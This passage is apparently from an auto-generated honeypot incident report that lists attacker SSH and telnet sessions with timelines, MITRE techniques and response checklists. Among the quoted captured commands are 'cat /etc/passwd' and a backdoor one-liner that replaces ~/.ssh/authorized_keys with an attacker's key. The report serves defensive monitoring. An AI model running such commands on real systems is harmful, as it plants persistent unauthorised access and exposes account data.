| Time (UTC) | Event |
|---|---|
| `2026-10-12 03:55:41` | `cowrie.session.connect` |
| `2026-10-12 03:55:41` | `cowrie.client.version` |
| `2026-10-12 03:55:42` | `cowrie.client.kex` |
| `2026-10-12 03:55:42` | `cowrie.login.success` |
| `2026-10-12 03:55:43` | `cowrie.session.params` |
| `2026-10-12 03:55:43` | `cowrie.command.input` |
| `2026-10-12 03:55:44` | `cowrie.command.failed` |
| `2026-10-12 04:00:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.78.63[.]123` to AbuseIPDB if not already reported
- [ ] Block `218.78.63[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d13dc6e2fb61

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]132` |
| **First Seen** | 2026-10-12 04:00 |
| **Last Seen** | 2026-10-12 04:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 04:00:02` | `cowrie.session.connect` |
| `2026-10-12 04:00:02` | `cowrie.client.version` |
| `2026-10-12 04:00:02` | `cowrie.client.kex` |
| `2026-10-12 04:00:02` | `cowrie.login.success` |
| `2026-10-12 04:00:03` | `cowrie.session.params` |
| `2026-10-12 04:00:03` | `cowrie.command.input` |
| `2026-10-12 04:00:04` | `cowrie.log.closed` |
| `2026-10-12 04:00:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]132` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4827ea012b29

| Field | Detail |
|---|---|
| **Source IP** | `34.53.129[.]203` |
| **First Seen** | 2026-10-12 04:10 |
| **Last Seen** | 2026-10-12 04:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 04:10:32` | `cowrie.session.connect` |
| `2026-10-12 04:10:32` | `cowrie.login.success` |
| `2026-10-12 04:10:33` | `cowrie.session.params` |
| `2026-10-12 04:10:33` | `cowrie.command.input` |
| `2026-10-12 04:10:33` | `cowrie.command.input` |
| `2026-10-12 04:10:33` | `cowrie.command.failed` |
| `2026-10-12 04:10:33` | `cowrie.command.input` |
| `2026-10-12 04:10:33` | `cowrie.log.closed` |
| `2026-10-12 04:10:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.53.129[.]203` to AbuseIPDB if not already reported
- [ ] Block `34.53.129[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a039473ffe8

| Field | Detail |
|---|---|
| **Source IP** | `34.53.129[.]203` |
| **First Seen** | 2026-10-12 04:10 |
| **Last Seen** | 2026-10-12 04:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 04:10:46` | `cowrie.session.connect` |
| `2026-10-12 04:10:46` | `cowrie.login.success` |
| `2026-10-12 04:10:46` | `cowrie.session.params` |
| `2026-10-12 04:10:46` | `cowrie.command.input` |
| `2026-10-12 04:10:46` | `cowrie.command.failed` |
| `2026-10-12 04:10:49` | `cowrie.log.closed` |
| `2026-10-12 04:10:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.53.129[.]203` to AbuseIPDB if not already reported
- [ ] Block `34.53.129[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccbf7d840d06

| Field | Detail |
|---|---|
| **Source IP** | `34.53.129[.]203` |
| **First Seen** | 2026-10-12 04:10 |
| **Last Seen** | 2026-10-12 04:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 04:10:48` | `cowrie.session.connect` |
| `2026-10-12 04:10:48` | `cowrie.login.success` |
| `2026-10-12 04:10:48` | `cowrie.session.params` |
| `2026-10-12 04:10:48` | `cowrie.command.input` |
| `2026-10-12 04:10:49` | `cowrie.log.closed` |
| `2026-10-12 04:10:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.53.129[.]203` to AbuseIPDB if not already reported
- [ ] Block `34.53.129[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c96d72e62b2

| Field | Detail |
|---|---|
| **Source IP** | `47.251.185[.]146` |
| **First Seen** | 2026-10-12 04:18 |
| **Last Seen** | 2026-10-12 04:19 |
| **Session Duration** | 61s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 04:18:38` | `cowrie.session.connect` |
| `2026-10-12 04:18:38` | `cowrie.telnet.option` |
| `2026-10-12 04:18:38` | `cowrie.telnet.option` |
| `2026-10-12 04:18:38` | `cowrie.login.success` |
| `2026-10-12 04:18:39` | `cowrie.session.params` |
| `2026-10-12 04:18:39` | `cowrie.telnet.option` |
| `2026-10-12 04:18:39` | `cowrie.telnet.option` |
| `2026-10-12 04:18:39` | `cowrie.command.input` |
| `2026-10-12 04:18:39` | `cowrie.command.input` |
| `2026-10-12 04:18:39` | `cowrie.command.input` |
| `2026-10-12 04:18:39` | `cowrie.command.input` |
| `2026-10-12 04:18:39` | `cowrie.command.failed` |
| `2026-10-12 04:18:39` | `cowrie.command.input` |
| `2026-10-12 04:18:39` | `cowrie.command.failed` |
| `2026-10-12 04:18:39` | `cowrie.command.input` |
| … | _19 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `47.251.185[.]146` to AbuseIPDB if not already reported
- [ ] Block `47.251.185[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61e863a70352

| Field | Detail |
|---|---|
| **Source IP** | `66.228.62[.]150` |
| **First Seen** | 2026-10-12 04:42 |
| **Last Seen** | 2026-10-12 04:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 04:42:33` | `cowrie.session.connect` |
| `2026-10-12 04:42:33` | `cowrie.login.success` |
| `2026-10-12 04:42:33` | `cowrie.session.params` |
| `2026-10-12 04:42:35` | `cowrie.log.closed` |
| `2026-10-12 04:42:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.228.62[.]150` to AbuseIPDB if not already reported
- [ ] Block `66.228.62[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5620de78203f

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-12 04:42 |
| **Last Seen** | 2026-10-12 04:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 04:42:38` | `cowrie.session.connect` |
| `2026-10-12 04:42:38` | `cowrie.client.version` |
| `2026-10-12 04:42:38` | `cowrie.client.kex` |
| `2026-10-12 04:42:38` | `cowrie.login.success` |
| `2026-10-12 04:42:39` | `cowrie.direct-tcpip.request` |
| `2026-10-12 04:42:39` | `cowrie.direct-tcpip.data` |
| `2026-10-12 04:42:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-577d947a5e7f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-10-12 04:47 |
| **Last Seen** | 2026-10-12 04:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 04:47:40` | `cowrie.session.connect` |
| `2026-10-12 04:47:40` | `cowrie.client.version` |
| `2026-10-12 04:47:40` | `cowrie.client.kex` |
| `2026-10-12 04:47:41` | `cowrie.login.success` |
| `2026-10-12 04:47:41` | `cowrie.session.params` |
| `2026-10-12 04:47:41` | `cowrie.command.input` |
| `2026-10-12 04:47:41` | `cowrie.log.closed` |
| `2026-10-12 04:47:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80c3dded3a9b

| Field | Detail |
|---|---|
| **Source IP** | `41.111.172[.]25` |
| **First Seen** | 2026-10-12 05:18 |
| **Last Seen** | 2026-10-12 05:19 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 05:18:54` | `cowrie.session.connect` |
| `2026-10-12 05:18:54` | `cowrie.client.version` |
| `2026-10-12 05:18:54` | `cowrie.client.kex` |
| `2026-10-12 05:18:55` | `cowrie.login.success` |
| `2026-10-12 05:19:40` | `cowrie.session.file_upload` |
| `2026-10-12 05:19:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.111.172[.]25` to AbuseIPDB if not already reported
- [ ] Block `41.111.172[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f4a20bd2789

| Field | Detail |
|---|---|
| **Source IP** | `89.134.210[.]246` |
| **First Seen** | 2026-10-12 05:20 |
| **Last Seen** | 2026-10-12 05:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 05:20:20` | `cowrie.session.connect` |
| `2026-10-12 05:20:20` | `cowrie.client.version` |
| `2026-10-12 05:20:20` | `cowrie.client.kex` |
| `2026-10-12 05:20:20` | `cowrie.login.success` |
| `2026-10-12 05:20:21` | `cowrie.session.params` |
| `2026-10-12 05:20:21` | `cowrie.command.input` |
| `2026-10-12 05:20:21` | `cowrie.command.failed` |
| `2026-10-12 05:20:22` | `cowrie.log.closed` |
| `2026-10-12 05:20:22` | `cowrie.session.params` |
| `2026-10-12 05:20:22` | `cowrie.command.input` |
| `2026-10-12 05:20:22` | `cowrie.session.file_download` |
| `2026-10-12 05:20:22` | `cowrie.log.closed` |
| `2026-10-12 05:20:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.134.210[.]246` to AbuseIPDB if not already reported
- [ ] Block `89.134.210[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (145) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-27b6ff20fec2 | HIGH | `89.134.210[.]246` | 2026-10-12 05:20 | Y | 0 | 0 | `T1078 · T1592` |
| IR-587088dbe42c | HIGH | `183.56.216[.]153` | 2026-10-12 05:21 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-eaabe076b9d0 | HIGH | `183.56.216[.]153` | 2026-10-12 05:21 | Y | 0 | 0 | `T1078 · T1592` |
| IR-461027a7e428 | HIGH | `129.121.142[.]157` | 2026-10-12 05:25 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-9773f52a1290 | HIGH | `129.121.142[.]157` | 2026-10-12 05:25 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7b1c4a92b7c2 | HIGH | `43.165.190[.]208` | 2026-10-12 05:27 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2a7fae8080f3 | HIGH | `43.165.190[.]208` | 2026-10-12 05:27 | Y | 0 | 0 | `T1078 · T1592` |
| IR-36553375e046 | HIGH | `211.75.198[.]217` | 2026-10-12 05:29 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-654fab9d1a6c | HIGH | `211.75.198[.]217` | 2026-10-12 05:29 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f63fc3c7a2dc | HIGH | `40.121.179[.]100` | 2026-10-12 05:32 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-aca17b21673b | HIGH | `40.121.179[.]100` | 2026-10-12 05:32 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6f6887e0873e | HIGH | `59.97.21[.]114` | 2026-10-12 05:37 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-8a0710f0200a | HIGH | `59.97.21[.]114` | 2026-10-12 05:37 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d935df5bc3c6 | HIGH | `114.67.232[.]93` | 2026-10-12 05:38 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b0ad28e6eef3 | HIGH | `114.67.232[.]93` | 2026-10-12 05:38 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6296c221dc1e | HIGH | `195.178.110[.]218` | 2026-10-12 06:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-9effa0ead88a | HIGH | `80.94.92[.]234` | 2026-10-12 06:10 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-d45f18b7a1c8 | HIGH | `124.193.81[.]23` | 2026-10-12 06:12 | Y | 0 | 0 | `T1078 · T1592` |
| IR-282df3dcbcf3 | HIGH | `45.116.78[.]92` | 2026-10-12 06:12 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-d959d76ee24a | HIGH | `45.116.78[.]92` | 2026-10-12 06:12 | Y | 0 | 0 | `T1078 · T1592` |
| IR-55ca542f19a6 | HIGH | `124.193.81[.]23` | 2026-10-12 06:23 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-21c00c801f19 | HIGH | `51.254.205[.]161` | 2026-10-12 06:41 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7cfc2699bdc0 | HIGH | `51.254.205[.]161` | 2026-10-12 06:41 | Y | 0 | 0 | `T1078 · T1592` |
| IR-acd18a166619 | HIGH | `176.53.159[.]196` | 2026-10-12 06:57 | Y | 0 | 0 | `T1078 · T1592` |
| IR-98f42b5d1add | HIGH | `61.76.38[.]54` | 2026-10-12 07:16 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-1a2578dee894 | HIGH | `61.76.38[.]54` | 2026-10-12 07:16 | Y | 0 | 0 | `T1078 · T1592` |
| IR-14d26bdb8887 | HIGH | `98.71.8[.]129` | 2026-10-12 07:19 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-afbd6db7fbf8 | HIGH | `98.71.8[.]129` | 2026-10-12 07:19 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c0a90197e21b | HIGH | `203.170.192[.]251` | 2026-10-12 07:21 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7963fc124789 | HIGH | `203.170.192[.]251` | 2026-10-12 07:21 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2c8ff2add888 | HIGH | `65.49.1[.]80` | 2026-10-12 07:21 | Y | 3 | 0 | `T1078` |
| IR-18bc8b8b1017 | HIGH | `103.46.186[.]148` | 2026-10-12 07:41 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8fdf41a3e85b | HIGH | `130.12.180[.]51` | 2026-10-12 07:41 | Y | 1 | 2 | `T1021.004 · T1059.004 · T1078` |
| IR-94afaef69432 | HIGH | `47.251.101[.]164` | 2026-10-12 07:51 | Y | 16 | 0 | `T1003.008 · T1021.004 · T1059.004` |
| IR-7e1f250ca95e | HIGH | `195.178.110[.]218` | 2026-10-12 08:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-7758d6883802 | HIGH | `109.160.32[.]172` | 2026-10-12 08:12 | Y | 1 | 0 | `T1078 · T1592` |
| IR-b75a05896539 | HIGH | `107.150.123[.]48` | 2026-10-12 08:21 | Y | 16 | 0 | `T1003.008 · T1021.004 · T1059.004` |
| IR-5984dedab2d3 | HIGH | `176.53.159[.]196` | 2026-10-12 08:29 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4de390811a60 | HIGH | `45.184.48[.]247` | 2026-10-12 08:50 | Y | 1 | 0 | `T1078 · T1083 · T1592` |
| IR-2ceb6fa633ea | HIGH | `195.178.110[.]217` | 2026-10-12 09:03 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-a48868585c5e | HIGH | `154.83.196[.]237` | 2026-10-12 09:04 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-d50c6fdfdf75 | HIGH | `154.83.196[.]237` | 2026-10-12 09:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-25899b583d75 | HIGH | `80.94.92[.]55` | 2026-10-12 09:10 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-0b36dbee8013 | HIGH | `109.160.32[.]106` | 2026-10-12 09:14 | Y | 1 | 0 | `T1078 · T1592` |
| IR-12ace46883cd | HIGH | `103.200.23[.]154` | 2026-10-12 09:54 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b840640e86aa | HIGH | `103.200.23[.]154` | 2026-10-12 09:54 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c68bd37db860 | HIGH | `103.191.14[.]243` | 2026-10-12 09:57 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2da90e5b1071 | HIGH | `103.191.14[.]243` | 2026-10-12 09:57 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e1db07814dd2 | HIGH | `172.96.182[.]111` | 2026-10-12 10:00 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-dd80483cd08e | HIGH | `172.96.182[.]111` | 2026-10-12 10:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c1a093283ac6 | HIGH | `80.94.92[.]55` | 2026-10-12 10:00 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-29ea93c2b7e5 | HIGH | `195.178.110[.]217` | 2026-10-12 10:01 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-d638825735b2 | HIGH | `45.184.48[.]247` | 2026-10-12 10:11 | Y | 1 | 0 | `T1078 · T1592` |
| IR-ce5b0829847a | HIGH | `176.53.159[.]196` | 2026-10-12 10:38 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7f1ac6f1e792 | HIGH | `172.105.128[.]12` | 2026-10-12 10:40 | Y | 3 | 0 | `T1078` |
| IR-a43fb6d8fd3c | HIGH | `120.27.135[.]110` | 2026-10-12 10:47 | Y | 1 | 0 | `T1078 · T1592` |
| IR-abcdc14ba4a9 | HIGH | `91.92.199[.]36` | 2026-10-12 10:58 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b9841b1cae44 | HIGH | `91.92.199[.]36` | 2026-10-12 10:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c1fa9b64e3cb | HIGH | `165.154.45[.]62` | 2026-10-12 11:07 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-42cf2776ee4b | HIGH | `165.154.45[.]62` | 2026-10-12 11:07 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c9bd8ce2e9f5 | HIGH | `124.221.95[.]208` | 2026-10-12 11:18 | Y | 16 | 0 | `T1003.008 · T1021.004 · T1059.004` |
| IR-f0e8c9bc564a | HIGH | `117.50.46[.]117` | 2026-10-12 11:18 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-4241f325bee7 | HIGH | `45.184.48[.]247` | 2026-10-12 11:39 | Y | 1 | 0 | `T1078 · T1083 · T1592` |
| IR-3504d1b35f3e | HIGH | `47.85.183[.]250` | 2026-10-12 11:54 | Y | 0 | 0 | `T1078 · T1592` |
| IR-cb1662630a7a | HIGH | `130.12.180[.]51` | 2026-10-12 11:54 | Y | 1 | 2 | `T1021.004 · T1059.004 · T1078` |
| IR-15db7a4362f4 | HIGH | `172.190.51[.]254` | 2026-10-12 11:54 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c73a051635db | HIGH | `172.190.51[.]254` | 2026-10-12 11:54 | Y | 0 | 0 | `T1078 · T1592` |
| IR-357b5da04f5e | HIGH | `113.44.77[.]37` | 2026-10-12 12:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d9295ecacf7c | HIGH | `113.44.77[.]37` | 2026-10-12 12:16 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-16581754cb76 | HIGH | `152.32.225[.]117` | 2026-10-12 12:20 | Y | 0 | 0 | `T1078 · T1592` |
| IR-de2cd67c74fa | HIGH | `130.12.180[.]51` | 2026-10-12 12:20 | Y | 1 | 2 | `T1021.004 · T1059.004 · T1078` |
| IR-e72a62d5edb2 | HIGH | `176.53.159[.]196` | 2026-10-12 12:23 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ad903ccc9f0e | HIGH | `113.44.77[.]37` | 2026-10-12 12:27 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-dfff287457e4 | HIGH | `45.148.10[.]61` | 2026-10-12 12:28 | Y | 1 | 0 | `T1078 · T1592` |
| IR-8ba712524baa | HIGH | `46.253.45[.]10` | 2026-10-12 12:33 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-37116a9f9d92 | HIGH | `46.253.45[.]10` | 2026-10-12 12:33 | Y | 0 | 0 | `T1078 · T1592` |
| IR-88b2ac0e3236 | HIGH | `165.154.1[.]144` | 2026-10-12 12:35 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8ad4a6f39efe | HIGH | `116.123.150[.]231` | 2026-10-12 12:39 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-34a59b06a316 | HIGH | `116.123.150[.]231` | 2026-10-12 12:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-921b88f90c10 | HIGH | `193.112.192[.]91` | 2026-10-12 13:08 | Y | 1 | 0 | `T1078 · T1592` |
| IR-0e8888b031ee | HIGH | `45.148.10[.]240` | 2026-10-12 13:37 | Y | 1 | 0 | `T1078 · T1592` |
| IR-8e712b51ed61 | HIGH | `160.119.66[.]206` | 2026-10-12 13:47 | Y | 1 | 3 | `T1059.004 · T1078 · T1105` |
| IR-aad5e033c6dd | HIGH | `40.121.179[.]100` | 2026-10-12 14:00 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-36e4aaa6947c | HIGH | `40.121.179[.]100` | 2026-10-12 14:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5154b1bd6427 | HIGH | `160.119.66[.]206` | 2026-10-12 14:01 | Y | 1 | 3 | `T1059.004 · T1078 · T1105` |
| IR-5ce558efe41b | HIGH | `217.182.253[.]249` | 2026-10-12 14:01 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-1e83c463f5de | HIGH | `217.182.253[.]249` | 2026-10-12 14:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-97b2eca14030 | HIGH | `129.121.115[.]119` | 2026-10-12 14:02 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-02d77a170f34 | HIGH | `129.121.115[.]119` | 2026-10-12 14:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-323f556c88d0 | HIGH | `52.172.177[.]191` | 2026-10-12 14:02 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c95b9eff1403 | HIGH | `52.172.177[.]191` | 2026-10-12 14:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-828501889fbd | HIGH | `172.160.227[.]37` | 2026-10-12 14:02 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-deaf75953283 | HIGH | `172.160.227[.]37` | 2026-10-12 14:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5c87755c7d40 | HIGH | `177.10.203[.]106` | 2026-10-12 14:04 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-8393946b1a64 | HIGH | `177.10.203[.]106` | 2026-10-12 14:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-681f4b59c87f | HIGH | `129.121.142[.]210` | 2026-10-12 14:05 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-141413573c63 | HIGH | `129.121.142[.]210` | 2026-10-12 14:05 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ed6fefe56964 | HIGH | `163.7.3[.]241` | 2026-10-12 14:05 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-fc6a525100d6 | HIGH | `163.7.3[.]241` | 2026-10-12 14:05 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a1b0bd9e6d08 | HIGH | `5.165.19[.]3` | 2026-10-12 14:08 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
_… 45 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.19.117[.]129` | **6** | 2026-10-12 06:58 | 2026-10-12 16:54 | 0m | 12 | `T1110.001 · T1592` | 🟢 LOW |
| `132.148.30[.]167` | **3** | 2026-10-12 10:57 | 2026-10-12 14:22 | 2m | 0 | `T1592` | 🟢 LOW |
| `113.44.77[.]37` | **2** | 2026-10-12 11:55 | 2026-10-12 12:14 | 4m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **2** | 2026-10-12 03:01 | 2026-10-12 04:02 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-10-12 02:56 | 2026-10-12 04:04 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-10-12 14:16 | 2026-10-12 16:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]218` | **2** | 2026-10-12 04:47 | 2026-10-12 06:11 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `80.94.92[.]55` | **2** | 2026-10-12 09:23 | 2026-10-12 10:11 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `101.132.85[.]130` | 1 | 2026-10-12 14:17 | 2026-10-12 14:17 | 2s | 0 | `T1592` | 🟢 LOW |
| `101.66.165[.]103` | 1 | 2026-10-12 17:42 | 2026-10-12 17:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `101.96.212[.]62` | 1 | 2026-10-12 15:49 | 2026-10-12 15:49 | 0s | 0 | `T1592` | 🟢 LOW |
